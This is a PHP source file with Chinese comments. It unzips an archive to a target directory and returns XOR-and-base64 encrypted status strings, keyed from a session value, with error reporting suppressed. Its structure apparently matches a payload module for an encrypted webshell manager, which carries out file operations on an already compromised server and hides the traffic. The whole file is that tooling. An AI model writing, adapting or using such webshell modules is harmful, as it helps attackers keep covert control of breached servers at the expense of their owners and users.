error_reporting(0);

function main($zipPath = "", $extractPath = "")
{
    session_start();
    $key = $_SESSION['k'];
    
    try {
        // 检查输入参数
        if (empty($zipPath) || empty($extractPath)) {
            echo encrypt("False", $key);
            return false;
        }
        
        // 检查ZIP文件是否存在
        if (!file_exists($zipPath)) {
            echo encrypt("False", $key);
            return false;
        }
        
        // 检查ZIP文件是否可读
        if (!is_readable($zipPath)) {
            echo encrypt("False", $key);
            return false;
        }
        
        // 检查目标目录是否存在，不存在则创建
        if (!is_dir($extractPath)) {
            if (!mkdir($extractPath, 0755, true)) {
                echo encrypt("False", $key);
                return false;
            }
        }
        
        // 检查目标目录是否可写
        if (!is_writable($extractPath)) {
            echo encrypt("False", $key);
            return false;
        }
        
        $zip = new ZipArchive();
        
        // 尝试打开ZIP文件
        $result = $zip->open($zipPath);
        if ($result !== TRUE) {
            echo encrypt("False", $key);
            return false;
        }
        
        // 验证ZIP文件完整性
        if ($zip->numFiles == 0) {
            $zip->close();
            echo encrypt("False", $key);
            return false;
        }
        
        // 安全检查：防止目录遍历攻击
        for ($i = 0; $i < $zip->numFiles; $i++) {
            $filename = $zip->getNameIndex($i);
            if (strpos($filename, '../') !== false || strpos($filename, '..\\') !== false) {
                $zip->close();
                echo encrypt("False", $key);
                return false;
            }
        }
        
        // 解压文件
        if (!$zip->extractTo($extractPath)) {
            $zip->close();
            echo encrypt("False", $key);
            return false;
        }
        
        // 关闭ZIP文件
        if (!$zip->close()) {
            echo encrypt("False", $key);
            return false;
        }
        
        // 验证解压是否成功（检查是否有文件被解压）
        if (countExtractedFiles($extractPath) > 0) {
            echo encrypt("Success", $key);
            return true;
        } else {
            echo encrypt("False", $key);
            return false;
        }
        
    } catch (Exception $e) {
        echo encrypt("False", $key);
        return false;
    } catch (Error $e) {
        echo encrypt("False", $key);
        return false;
    }
}

function countExtractedFiles($path)
{
    try {
        if (!is_dir($path) || !is_readable($path)) {
            return 0;
        }
        
        $count = 0;
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        
        foreach ($iterator as $file) {
            if ($file->isFile()) {
                $count++;
            }
        }
        
        return $count;
        
    } catch (Exception $e) {
        return 0;
    }
}

function encrypt($data, $key)
{
    for ($i = 0; $i < strlen($data); $i++) {
        $data[$i] = $data[$i] ^ $key[$i + 5 & 15];
    }
    return base64_encode($data);
}